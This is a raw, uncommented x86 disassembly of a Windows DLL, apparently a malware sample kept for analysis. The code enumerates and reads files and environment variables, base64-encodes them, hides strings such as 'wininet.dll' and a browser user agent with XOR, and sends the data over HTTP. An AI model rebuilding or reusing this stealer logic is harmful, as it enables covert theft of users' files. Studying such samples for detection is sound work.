mov [ rw-data ] eax
mov eax [ ebp + 0xc ]
sub eax 0x0
je r-xdata
push 0x7d0
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
dec eax
jne r-xdata
xor eax eax
push esi
mov esi [ CloseHandle@IAT ]
push [ rw-data ]
call esi
push [ rw-data ]
call esi
pop esi
call sub_100021d7
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
push 0x104
push eax
push [ rw-data ]
call [ GetModuleFileNameA@IAT ]
test eax eax
je r-xdata
push 0x27
call ordinal_4
pop ecx
jmp r-xdata
and [ ebp + 0x8 ] 0x0
lea eax [ ebp + 0x8 ]
push eax
call sub_100015f7
test eax eax
pop ecx
jne r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x160
push eax
lea eax [ ebp - 0x104 ]
push eax
call [ strstr@IAT ]
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
jmp r-xdata
leave
retn 0xc
sub_100021d7
push ebp
mov ebp esp
sub esp 0x34
and [ ebp - 0x34 ] 0x0
push ebx
push esi
push edi
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x33 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x4 ]
push eax
call sub_100015f7
test eax eax
pop ecx
jne r-xdata
xor eax eax
and [ ebp - 0x14 ] al
lea edi [ ebp - 0x13 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
stosw [ edi ]
stosb [ edi ]
lea eax [ ebp - 0x14 ]
push 0xa
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x19 ]
push eax
call [ _itoa@IAT ]
mov esi rw-data
push 0x10
lea eax [ ebp - 0x34 ]
push esi
push eax
call [ strncpy@IAT ]
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call strcat
add esp 0x20
mov edi 0x20000
push esi
mov esi [ OpenMutexA@IAT ]
push 0x1
push edi
call esi
test eax eax
je r-xdata
mov ebx [ GetLastError@IAT ]
call ebx
cmp eax 0x2
jne r-xdata
push eax
call [ CloseHandle@IAT ]
lea eax [ ebp - 0x34 ]
push eax
push 0x1
push edi
call esi
test eax eax
jne r-xdata
call ebx
cmp eax 0x2
jne r-xdata
push [ ebp - 0x4 ]
call [ free@IAT ]
pop ecx
lea eax [ ebp - 0x34 ]
push eax
push 0x1
push 0x0
call [ CreateMutexA@IAT ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_100022a2
push ebp
mov ebp esp
sub esp 0x168
or [ ebp - 0x20 ] 0xffffffff
and [ ebp - 0x8 ] 0x0
or [ ebp - 0x18 ] 0xffffffff
push ebx
push esi
mov esi [ malloc@IAT ]
push edi
mov edi 0x100
push edi
call esi
mov ebx eax
pop ecx
test ebx ebx
mov [ ebp - 0x1c ] ebx
jne r-xdata
push edi
push 0x0
push ebx
call memset
mov eax [ ebp + 0x8 ]
push 0xff
add eax 0x42e
push eax
push ebx
call [ strncpy@IAT ]
push ebx
call strlen
mov edi 0x800
mov [ ebp - 0x28 ] eax
push edi
call esi
add esp 0x20
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
push [ ebp - 0x1c ]
mov esi [ free@IAT ]
call esi
cmp [ ebp - 0x14 ] 0x0
pop ecx
je r-xdata
push edi
push 0x0
push eax
call memset
push 0x140
lea eax [ ebp - 0x168 ]
push 0x0
push eax
call memset
mov edi 0x104
push edi
call esi
push edi
mov [ ebp - 0xc ] eax
call esi
add esp 0x20
cmp [ ebp - 0xc ] 0x0
mov ebx eax
mov [ ebp - 0x24 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call esi
pop ecx
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
push ebx
call [ free@IAT ]
pop ecx
push [ ebp - 0xc ]
call [ free@IAT ]
pop ecx
push edi
push 0x0
push [ ebp - 0xc ]
call memset
push edi
push 0x0
push ebx
call memset
add esp 0x18
push edi
push ebx
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0xffffffff
je r-xdata
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
mov ebx rw-data
add eax 0x194
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
push edi
push [ ebp - 0xc ]
add eax 0x194
push eax
lea eax [ ebp - 0x18 ]
push ebx
push eax
call sub_10002669
add esp 0x14
test eax eax
je r-xdata
push edi
lea eax [ ebp - 0x18 ]
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp - 0x24 ]
push eax
call sub_10002669
add esp 0x14
cmp [ ebp - 0x18 ] 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x8 ]
push 0x0
push ecx
push 0x800
push [ ebp - 0x14 ]
push eax
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1 ] 0x1
push edi
push ebx
push rw-data
call [ GetEnvironmentVariableA@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push [ ebp - 0xc ]
call [ CreateFileA@IAT ]
cmp eax 0xffffffff
mov [ ebp + 0x8 ] eax
je r-xdata
mov ebx [ ebp - 0x24 ]
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x8 ]
cmp eax 0x5dc
jae r-xdata
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
cmp [ ebp - 0x10 ] 0xa
jb r-xdata
mov eax [ ebp + 0x8 ]
push edi
push [ ebp - 0xc ]
add eax 0x194
push eax
lea eax [ ebp - 0x18 ]
push ebx
push eax
call sub_10002669
add esp 0x14
test eax eax
je r-xdata
push 0x800
push 0x0
push [ ebp - 0x14 ]
call memset
add esp 0xc
lea eax [ eax + eax + 0x9 ]
push eax
call esi
mov esi eax
pop ecx
test esi esi
je r-xdata
inc [ ebp - 0x10 ]
push 0x3e8
call [ Sleep@IAT ]
jmp r-xdata
mov esi [ malloc@IAT ]
mov eax [ ebp - 0x8 ]
lea eax [ eax + eax + 0x9 ]
push eax
push 0x0
push esi
call memset
push ebx
call strlen
push eax
push ebx
push esi
call [ strncpy@IAT ]
push ebx
call strlen
add [ ebp - 0x8 ] 0x6
add eax esi
push eax
push [ ebp - 0x14 ]
push [ ebp - 0x8 ]
call sub_1000256d
push esi
call strlen
mov [ ebp - 0x8 ] eax
mov [ esi + eax ] 0x25
mov eax [ ebp - 0x8 ]
push rw-data
mov [ esi + eax + 0x1 ] 0x25
mov eax [ ebp - 0x8 ]
and [ esi + eax + 0x2 ] 0x0
add [ ebp - 0x8 ] 0x2
push [ ebp - 0x8 ]
push esi
push [ ebp - 0x28 ]
push [ ebp - 0x1c ]
call sub_10002d02
add esp 0x44
test eax eax
ja r-xdata
push esi
call [ free@IAT ]
pop ecx
and [ ebp - 0x20 ] 0x0
sub_1000256d
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
push esi
mov esi [ ebp + 0x10 ]
jle r-xdata
push [ ebp + 0xc ]
call strlen
pop ecx
mov [ ebp + 0x8 ] eax
pop esi
leave
retn
push ebx
push edi
push 0x1
pop edi
lea eax [ edi + 0x1 ]
cmp eax [ ebp + 0x8 ]
jge r-xdata
mov al [ edi + eax ]
mov [ ebp + 0x13 ] al
mov al [ ebp - 0x1 ]
and al 0x3f
mov [ ebp - 0x8 ] al
mov al bl
shr al 0x2
push eax
call sub_10002643
mov [ esi ] al
mov al [ ebp + 0x13 ]
and bl 0x3
inc esi
shl bl 0x4
shr al 0x4
or bl al
push ebx
call sub_10002643
mov [ esi ] al
pop ecx
inc esi
cmp edi [ ebp + 0x8 ]
pop ecx
jge r-xdata
mov eax [ ebp + 0xc ]
mov al [ edi + eax + 0x1 ]
mov [ ebp - 0x1 ] al
mov [ esi ] 0x3d
mov al [ ebp + 0x13 ]
mov cl [ ebp - 0x1 ]
and al 0xf
shl al 0x2
shr cl 0x6
or al cl
push eax
call sub_10002643
pop ecx
mov [ esi ] al
jmp r-xdata
mov [ esi ] 0x3d
push [ ebp - 0x8 ]
call sub_10002643
pop ecx
mov [ esi ] al
jmp r-xdata
lea eax [ edi + 0x1 ]
inc esi
cmp eax [ ebp + 0x8 ]
jge r-xdata
mov eax [ ebp + 0xc ]
and [ ebp + 0x13 ] 0x0
and [ ebp - 0x1 ] 0x0
cmp edi [ ebp + 0x8 ]
mov bl [ eax + edi - 0x1 ]
jge r-xdata
pop edi
pop ebx
add edi 0x3
inc esi
lea eax [ edi - 0x1 ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
sub_10002643
mov al [ esp + 0x4 ]
cmp al 0x1a
jae r-xdata
cmp al 0x34
jae r-xdata
add eax 0x41
retn
cmp al 0x3e
jae r-xdata
add eax 0x47
retn
setne al
dec eax
and al 0xfc
add eax 0x2f
retn
sub eax 0x4
retn
sub_10002669
push ebp
mov ebp esp
sub esp 0x144
push ebx
push esi
mov esi 0x104
push edi
push esi
mov [ ebp - 0x4 ] 0x12
call [ malloc@IAT ]
mov ebx eax
xor edi edi
cmp ebx edi
pop ecx
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
push 0x140
lea eax [ ebp - 0x144 ]
push edi
push eax
call memset
push esi
push edi
push ebx
call memset
mov esi [ ebp + 0x8 ]
add esp 0x18
mov eax [ esi ]
cmp eax 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x144 ]
push ecx
push eax
call [ FindNextFileA@IAT ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
push ebx
call strcpy
mov edi rw-data
push edi
push ebx
call strcat
push [ ebp + 0x10 ]
push ebx
call strcat
add esp 0x18
lea eax [ ebp - 0x144 ]
push eax
push ebx
call [ FindFirstFileA@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
push [ esi ]
mov [ ebp - 0x4 ] 0x12
call [ FindClose@IAT ]
or [ esi ] 0xffffffff
lea eax [ ebp - 0x118 ]
push eax
call strlen
pop ecx
mov ecx [ ebp + 0x18 ]
lea edx [ ecx - 0x1 ]
cmp eax edx
jbe r-xdata
lea eax [ ebp - 0x118 ]
mov [ esi ] ebx
push eax
call strlen
pop ecx
mov ecx [ ebp + 0x18 ]
dec ecx
cmp eax ecx
jbe r-xdata
mov esi [ ebp + 0x14 ]
push ecx
push edi
push esi
call memset
push [ ebp + 0xc ]
push esi
call strcpy
push rw-data
push esi
call strcat
lea eax [ ebp - 0x118 ]
push eax
push esi
call strcat
add esp 0x24
mov [ ebp - 0x4 ] edi
jmp r-xdata
push [ esi ]
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
call strcpy
push edi
push [ ebp + 0x14 ]
call strcat
lea eax [ ebp - 0x118 ]
push eax
push [ ebp + 0x14 ]
call strcat
add esp 0x18
and [ ebp - 0x4 ] 0x0
mov [ esi ] ebx
jmp r-xdata
mov [ ebp - 0x4 ] 0x2
push ebx
jmp r-xdata
call [ FindClose@IAT ]
jmp r-xdata
sub_100027d4
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x24
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x2c ] eax
or [ ebp - 0x34 ] 0xffffffff
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x4 ] 0x1
mov edi rw-data
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_100043d2
mov esi 0x100
push esi
call [ malloc@IAT ]
add esp 0x10
mov ebx eax
mov [ ebp - 0x2c ] ebx
test ebx ebx
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_10002892
jmp r-xdata
push esi
push 0x0
push ebx
call memset
push 0xff
mov eax [ ebp + 0x8 ]
add eax 0x32f
push eax
push ebx
call [ strncpy@IAT ]
push ebx
call strlen
mov [ ebp - 0x1c ] eax
push edi
push 0x1
push 0x3
push [ ebp - 0x28 ]
push [ ebp - 0x20 ]
push ebx
call sub_100028d6
add esp 0x34
mov [ ebp - 0x30 ] eax
test eax eax
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x34 ] 0x0
sub_10002892
cmp [ ebp - 0x20 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
push [ ebp - 0x20 ]
call [ free@IAT ]
pop ecx
and [ ebp - 0x20 ] 0x0
retn
push ebx
call [ free@IAT ]
pop ecx
and [ ebp - 0x2c ] 0x0
sub_100028d6
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x90
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x54 ] ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x38 ] 0x32
mov [ ebp - 0x37 ] 0x10
mov [ ebp - 0x36 ] 0x5
mov [ ebp - 0x35 ] 0x16
mov [ ebp - 0x34 ] 0x13
mov [ ebp - 0x33 ] 0x13
mov [ ebp - 0x32 ] 0x1e
mov [ ebp - 0x31 ] 0x50
mov [ ebp - 0x30 ] 0x4b
mov [ ebp - 0x2f ] 0x51
mov [ ebp - 0x2e ] 0x4f
mov [ ebp - 0x2d ] 0x5f
mov [ ebp - 0x2c ] 0x57
mov [ ebp - 0x2b ] 0x1c
mov [ ebp - 0x2a ] 0x10
mov [ ebp - 0x29 ] 0x12
mov [ ebp - 0x28 ] 0xf
mov [ ebp - 0x27 ] 0x1e
mov [ ebp - 0x26 ] 0xb
mov [ ebp - 0x25 ] 0x16
mov [ ebp - 0x24 ] 0x1d
mov [ ebp - 0x23 ] 0x13
mov [ ebp - 0x22 ] 0x1a
mov [ ebp - 0x21 ] 0x44
mov [ ebp - 0x20 ] 0x56
mov [ ebp - 0x1f ] bl
mov [ ebp - 0x4 ] ebx
push 0x1
pop edi
mov [ ebp - 0x4 ] edi
call sub_10002f79
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
imul eax eax 0x3e8
mov [ ebp - 0x90 ] eax
push eax
mov esi [ Sleep@IAT ]
call esi
lea eax [ ebp - 0x38 ]
push eax
call sub_100075ee
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x80 ] ebx
push edi
push rw-data
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x8 ]
call sub_1000420e
add esp 0x18
test eax eax
jne r-xdata
mov [ ebp - 0x50 ] 0xffffe4a6
jmp r-xdata
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x74 ] bl
mov [ ebp - 0x88 ] bl
mov edi rw-data
mov [ ebp - 0x50 ] 0xffffe4a7
jmp r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10002c5d
jmp r-xdata
inc [ ebp - 0x6c ]
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x38 ]
push eax
call [ rw-data ]
mov [ ebp - 0x58 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x50 ] 0xffffe4a5
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x50 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push ebx
push ebx
push 0x3
push edi
push edi
push 0x50
push [ ebp + 0x8 ]
push eax
call [ rw-data ]
mov [ ebp - 0x54 ] eax
cmp eax ebx
jne r-xdata
call sub_100041e6
push eax
call esi
mov [ ebp - 0x50 ] 0xffffe4a4
jmp r-xdata
push ebx
push 0x4000000
push ebx
push ebx
push rw-data
push [ ebp - 0x44 ]
push rw-data
push eax
call [ rw-data ]
mov [ ebp - 0x40 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x58 ]
call [ rw-data ]
mov [ ebp - 0x58 ] ebx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push eax
call [ rw-data ]
mov [ ebp - 0x98 ] eax
cmp eax ebx
jne r-xdata
push [ ebp - 0x58 ]
call [ rw-data ]
mov [ ebp - 0x58 ] ebx
push [ ebp - 0x54 ]
call [ rw-data ]
mov [ ebp - 0x54 ] ebx
jmp r-xdata
call sub_100041e6
push eax
call esi
jmp r-xdata
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x68 ] ebx
lea eax [ ebp - 0x68 ]
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp - 0x40 ]
call sub_10003417
add esp 0xc
mov [ ebp - 0x64 ] eax
cmp eax ebx
jg r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0xa0 ] eax
push [ ebp - 0x58 ]
call [ rw-data ]
mov [ ebp - 0x58 ] ebx
push [ ebp - 0x54 ]
call [ rw-data ]
mov [ ebp - 0x54 ] ebx
push [ ebp - 0x40 ]
call [ rw-data ]
mov [ ebp - 0x40 ] ebx
push ebx
call sub_10007578
pop ecx
dec eax
dec eax
neg eax
sbb eax eax
inc eax
mov [ ebp - 0x9c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x6c ]
cmp eax [ ebp + 0x18 ]
jb r-xdata
cmp [ ebp - 0x54 ] ebx
je r-xdata
mov [ ebp - 0x50 ] 0xffffe4a3
jmp r-xdata
call sub_10006e05
test eax eax
je r-xdata
cmp [ ebp - 0x40 ] ebx
je r-xdata
push [ ebp - 0x54 ]
call [ rw-data ]
mov [ ebp - 0x54 ] ebx
cmp [ ebp - 0x74 ] bl
jne r-xdata
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x84 ] ebx
mov eax [ ebp - 0x4c ]
mov [ ebp - 0x3c ] eax
lea ecx [ ebp - 0x84 ]
push ecx
lea ecx [ ebp - 0x48 ]
push ecx
push ebx
lea ecx [ ebp - 0x60 ]
push ecx
push [ ebp - 0x68 ]
push eax
call sub_1000359e
add esp 0x18
test eax eax
jne r-xdata
push [ ebp - 0x40 ]
call [ rw-data ]
mov [ ebp - 0x40 ] ebx
cmp [ ebp - 0x88 ] bl
jne r-xdata
call sub_100042f0
mov [ ebp - 0x74 ] al
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x94 ] ebx
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x78 ] ebx
lea ecx [ ebp - 0x78 ]
push ecx
lea ecx [ ebp - 0x94 ]
push ecx
lea ecx [ ebp - 0x7c ]
push ecx
push [ ebp + 0x1c ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ebx
push eax
push [ ebp - 0x58 ]
call sub_1000376d
add esp 0x24
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x78 ] ebx
je r-xdata
mov [ ebp - 0x50 ] 0xffffe4a2
jmp r-xdata
cmp [ ebp - 0x6c ] 0x1
jne r-xdata
cmp eax ebx
jl r-xdata
cmp [ ebp + 0x18 ] 0x1
jne r-xdata
mov eax [ ebp - 0x48 ]
mov [ ebp - 0x1c ] eax
push [ ebp - 0x94 ]
push [ ebp - 0x7c ]
push [ ebp + 0x1c ]
push [ ebp - 0x84 ]
push eax
push [ ebp - 0x58 ]
call sub_10003edb
add esp 0x18
mov [ ebp - 0x8c ] eax
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x88 ] 0x1
sub_10002c5d
cmp [ ebp - 0x44 ] ebx
je r-xdata
mov esi [ free@IAT ]
push [ ebp - 0x44 ]
mov esi [ free@IAT ]
call esi
pop ecx
mov [ ebp - 0x44 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x5c ]
call esi
pop ecx
mov [ ebp - 0x5c ] ebx
cmp [ ebp - 0x5c ] ebx
je r-xdata
cmp [ ebp - 0x3c ] ebx
je r-xdata
push [ ebp - 0x1c ]
call esi
pop ecx
mov [ ebp - 0x1c ] ebx
cmp [ ebp - 0x58 ] ebx
je r-xdata
push [ ebp - 0x3c ]
call esi
pop ecx
mov [ ebp - 0x3c ] ebx
cmp [ ebp - 0x54 ] ebx
je r-xdata
push [ ebp - 0x58 ]
call [ rw-data ]
mov [ ebp - 0x58 ] ebx
cmp [ ebp - 0x40 ] ebx
je r-xdata
push [ ebp - 0x54 ]
call [ rw-data ]
mov [ ebp - 0x54 ] ebx
call sub_10002f61
retn
push [ ebp - 0x40 ]
call [ rw-data ]
mov [ ebp - 0x40 ] ebx
sub_10002d02
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4c
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x3c ] 0x32
mov [ ebp - 0x3b ] 0x10
mov [ ebp - 0x3a ] 0x5
mov [ ebp - 0x39 ] 0x16
mov [ ebp - 0x38 ] 0x13
mov [ ebp - 0x37 ] 0x13
mov [ ebp - 0x36 ] 0x1e
mov [ ebp - 0x35 ] 0x50
mov [ ebp - 0x34 ] 0x4b
mov [ ebp - 0x33 ] 0x51
mov [ ebp - 0x32 ] 0x4f
mov [ ebp - 0x31 ] 0x5f
mov [ ebp - 0x30 ] 0x57
mov [ ebp - 0x2f ] 0x1c
mov [ ebp - 0x2e ] 0x10
mov [ ebp - 0x2d ] 0x12
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x2b ] 0x1e
mov [ ebp - 0x2a ] 0xb
mov [ ebp - 0x29 ] 0x16
mov [ ebp - 0x28 ] 0x1d
mov [ ebp - 0x27 ] 0x13
mov [ ebp - 0x26 ] 0x1a
mov [ ebp - 0x25 ] 0x44
mov [ ebp - 0x24 ] 0x56
mov [ ebp - 0x23 ] bl
mov [ ebp - 0x20 ] 0x40
mov [ ebp - 0x1f ] 0x5a
mov [ ebp - 0x1e ] 0x5a
mov [ ebp - 0x1d ] bl
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x3c ]
push eax
call sub_100075ee
lea eax [ ebp - 0x20 ]
push eax
call sub_100075ee
pop ecx
pop ecx
call sub_10002f79
test eax eax
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
call strlen
mov [ ebp - 0x5c ] eax
mov ecx [ ebp + 0xc ]
lea esi [ eax + ecx ]
mov [ ebp - 0x48 ] esi
lea eax [ esi + 0x1 ]
push eax
call [ malloc@IAT ]
pop ecx
pop ecx
mov edi eax
mov [ ebp - 0x1c ] edi
cmp edi ebx
jne r-xdata
mov [ ebp - 0x40 ] 0xffffe4a6
jmp r-xdata
lea eax [ esi + 0x1 ]
push eax
push ebx
push edi
call memset
push esi
push [ ebp + 0x8 ]
push edi
call [ strncpy@IAT ]
push edi
call strlen
sub esi eax
push esi
lea eax [ ebp - 0x20 ]
push eax
push edi
call [ strncat@IAT ]
add esp 0x28
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x3c ]
push eax
call [ rw-data ]
mov [ ebp - 0x44 ] eax
cmp eax ebx
jne r-xdata
mov [ ebp - 0x40 ] 0xffffe4a1
jmp r-xdata
mov [ ebp - 0x4 ] ebx
call sub_10002f24
jmp r-xdata
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x4c ] ebx
lea ecx [ ebp - 0x4c ]
push ecx
lea ecx [ ebp - 0x58 ]
push ecx
lea ecx [ ebp - 0x50 ]
push ecx
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
push esi
push edi
push eax
call sub_1000376d
add esp 0x24
mov [ ebp - 0x40 ] eax
cmp eax ebx
jge r-xdata
mov [ ebp - 0x40 ] 0xffffe4a4
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x40 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
push ebx
call sub_10007578
pop ecx
dec eax
dec eax
neg eax
sbb eax eax
inc eax
mov [ ebp - 0x54 ] eax
cmp eax 0x1
jne r-xdata
call sub_10006e05
test eax eax
je r-xdata
push [ ebp - 0x44 ]
call [ rw-data ]
mov [ ebp - 0x44 ] ebx
call sub_100042f0
cmp al 0x1
jne r-xdata
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x3c ]
push eax
call [ rw-data ]
mov [ ebp - 0x44 ] eax
cmp eax ebx
je r-xdata
lea eax [ esi + 0x1 ]
push eax
push ebx
push edi
call memset
push esi
push [ ebp + 0x8 ]
push edi
call [ strncpy@IAT ]
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
push edi
push [ ebp - 0x44 ]
call sub_1000376d
add esp 0x3c
mov [ ebp - 0x40 ] eax
sub_10002f79
push ebp
mov ebp esp
push 0xffffffff
push r--data
push sub_1000c600
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xb0
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x84 ] 0x8
mov [ ebp - 0x83 ] 0x16
mov [ ebp - 0x82 ] 0x11
mov [ ebp - 0x81 ] 0x16
mov [ ebp - 0x80 ] 0x11
mov [ ebp - 0x7f ] 0x1a
mov [ ebp - 0x7e ] 0xb
mov [ ebp - 0x7d ] 0x51
mov [ ebp - 0x7c ] 0x1b
mov [ ebp - 0x7b ] 0x13
mov [ ebp - 0x7a ] 0x13
xor ebx ebx
mov [ ebp - 0x79 ] bl
mov [ ebp - 0xc0 ] 0x36
mov [ ebp - 0xbf ] 0x11
mov [ ebp - 0xbe ] 0xb
mov [ ebp - 0xbd ] 0x1a
mov [ ebp - 0xbc ] 0xd
mov [ ebp - 0xbb ] 0x11
mov [ ebp - 0xba ] 0x1a
mov [ ebp - 0xb9 ] 0xb
mov [ ebp - 0xb8 ] 0x3c
mov [ ebp - 0xb7 ] 0x10
mov [ ebp - 0xb6 ] 0x11
mov [ ebp - 0xb5 ] 0x11
mov [ ebp - 0xb4 ] 0x1a
mov [ ebp - 0xb3 ] 0x1c
mov [ ebp - 0xb2 ] 0xb
mov [ ebp - 0xb1 ] 0x3e
mov [ ebp - 0xb0 ] bl
mov [ ebp - 0x3c ] 0x36
mov [ ebp - 0x3b ] 0x11
mov [ ebp - 0x3a ] 0xb
mov [ ebp - 0x39 ] 0x1a
mov [ ebp - 0x38 ] 0xd
mov [ ebp - 0x37 ] 0x11
mov [ ebp - 0x36 ] 0x1a
mov [ ebp - 0x35 ] 0xb
mov [ ebp - 0x34 ] 0x30
mov [ ebp - 0x33 ] 0xf
mov [ ebp - 0x32 ] 0x1a
mov [ ebp - 0x31 ] 0x11
mov [ ebp - 0x30 ] 0x3e
mov [ ebp - 0x2f ] bl
mov [ ebp - 0xac ] 0x37
mov [ ebp - 0xab ] 0xb
mov [ ebp - 0xaa ] 0xb
mov [ ebp - 0xa9 ] 0xf
mov [ ebp - 0xa8 ] 0x30
mov [ ebp - 0xa7 ] 0xf
mov [ ebp - 0xa6 ] 0x1a
mov [ ebp - 0xa5 ] 0x11
mov [ ebp - 0xa4 ] 0x2d
mov [ ebp - 0xa3 ] 0x1a
mov [ ebp - 0xa2 ] 0xe
mov [ ebp - 0xa1 ] 0xa
mov [ ebp - 0xa0 ] 0x1a
mov [ ebp - 0x9f ] 0xc
mov [ ebp - 0x9e ] 0xb
mov [ ebp - 0x9d ] 0x3e
mov [ ebp - 0x9c ] bl
mov [ ebp - 0x64 ] 0x37
mov [ ebp - 0x63 ] 0xb
mov [ ebp - 0x62 ] 0xb
mov [ ebp - 0x61 ] 0xf
mov [ ebp - 0x60 ] 0x2c
mov [ ebp - 0x5f ] 0x1a
mov [ ebp - 0x5e ] 0x11
mov [ ebp - 0x5d ] 0x1b
mov [ ebp - 0x5c ] 0x2d
mov [ ebp - 0x5b ] 0x1a
mov [ ebp - 0x5a ] 0xe
mov [ ebp - 0x59 ] 0xa
mov [ ebp - 0x58 ] 0x1a
mov [ ebp - 0x57 ] 0xc
mov [ ebp - 0x56 ] 0xb
mov [ ebp - 0x55 ] 0x3e
mov [ ebp - 0x54 ] bl
mov [ ebp - 0x2c ] 0x37
mov [ ebp - 0x2b ] 0xb
mov [ ebp - 0x2a ] 0xb
mov [ ebp - 0x29 ] 0xf
mov [ ebp - 0x28 ] 0x2e
mov [ ebp - 0x27 ] 0xa
mov [ ebp - 0x26 ] 0x1a
mov [ ebp - 0x25 ] 0xd
mov [ ebp - 0x24 ] 0x6
